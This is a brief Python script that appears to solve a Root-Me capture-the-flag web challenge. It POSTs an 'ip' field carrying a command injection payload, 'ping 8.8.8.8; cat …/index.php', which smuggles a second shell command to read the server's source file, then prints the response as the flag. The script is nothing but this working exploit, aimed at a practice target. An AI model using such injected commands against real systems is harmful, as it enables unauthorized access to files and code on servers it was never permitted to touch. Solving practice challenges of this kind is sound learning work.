import requests
import re

url = 'http://challenge01.root-me.org/web-serveur/ch54/'

data = {'ip': 'ping 8.8.8.8; cat /challenge/web-serveur/ch54/index.php'}

# r = requests.get(url)
r = requests.post(url, data=data)

flag = r.text

print(flag)